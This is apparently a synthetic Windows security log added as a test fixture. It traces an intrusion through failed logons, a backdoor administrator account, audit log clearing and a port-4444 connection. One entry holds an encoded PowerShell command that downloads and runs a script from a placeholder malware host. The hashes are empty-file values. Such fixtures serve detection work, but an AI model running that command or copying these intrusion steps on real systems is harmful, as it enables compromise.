@@ -1,0 +1,29 @@
+[2024-01-10 08:11:22] Security Event ID 4625: Logon failure for user ADMINISTRATOR from source 45.33.32.156
+[2024-01-10 08:11:23] Security Event ID 4625: Logon failure for user ADMINISTRATOR from source 45.33.32.156
+[2024-01-10 08:11:24] Security Event ID 4625: Logon failure for user ADMINISTRATOR from source 45.33.32.156
+[2024-01-10 08:11:25] Security Event ID 4625: Logon failure for user ADMINISTRATOR from source 45.33.32.156
+[2024-01-10 08:11:26] Security Event ID 4625: Logon failure for user ADMINISTRATOR from source 45.33.32.156
+[2024-01-10 08:15:01] Security Event ID 4648: Logon with explicit credentials from user j.smith to host DC-01
+[2024-01-10 08:20:33] Security Event ID 4688: Process creation with command line: powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBtAGEAbAB3AGEAcgBlAC4AYwBvAG0ALwBzAGgAZQBsAGwALgBzAGgAVwAnACkA
+[2024-01-10 08:25:44] Security Event ID 4720: User account created: backdoor_user
+[2024-01-10 08:25:45] Security Event ID 4722: User account enabled: backdoor_user
+[2024-01-10 08:25:50] Security Event ID 4732: User added to Administrators group: backdoor_user
+[2024-01-10 08:30:12] Malware Protection: Threat detected in C:\Users\j.smith\Downloads\invoice.pdf.exe
+[2024-01-10 08:30:13] Malware Protection: Threat name: Trojan:Win32/AgentTesla!ml
+[2024-01-10 08:30:14] Malware Protection: File hash: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+[2024-01-10 08:35:22] Firewall: Connection blocked from 185.220.101.42 to port 445 TCP
+[2024-01-10 08:35:23] Firewall: Connection blocked from 185.220.101.42 to port 139 TCP
+[2024-01-10 08:35:24] Firewall: Connection blocked from 185.220.101.42 to port 135 TCP
+[2024-01-10 08:40:01] Security Event ID 4776: Domain controller authentication failure for user krbtgt from source 10.0.0.50
+[2024-01-10 08:45:11] PowerShell: Script block logging detected base64 encoded command from user admin
+[2024-01-10 08:45:12] PowerShell: Decoded URL: https://malware.com/shell.ps1
+[2024-01-10 08:50:33] Security Event ID 1102: Security audit log cleared by user WIN-ABC\administrator
+[2024-01-10 08:55:44] Security Event ID 7036: Service Windows Remote Management started
+[2024-01-10 09:00:01] DNS Query: suspiciousexample.com resolved to 91.121.87.34
+[2024-01-10 09:00:02] DNS Query: malwarecheck.net resolved to 198.51.100.23
+[2024-01-10 09:05:12] Security Event ID 4624: Logon success for user BACKUP from source 203.0.113.5
+[2024-01-10 09:05:13] Security Event ID 4672: Special privileges assigned to user BACKUP
+[2024-01-10 09:10:22] Security Event ID 5140: SMB share access to \\DC-01\ADMIN$ from 203.0.113.5
+[2024-01-10 09:15:33] Malware Protection: Quarantine file action taken for C:\temp\backdoor.exe
+[2024-01-10 09:15:34] Malware Protection: File hash: d41d8cd98f00b204e9800998ecf8427e
+[2024-01-10 09:20:44] Security Event ID 5156: Connection from 192.168.1.100 to 45.33.32.156 on port 4444
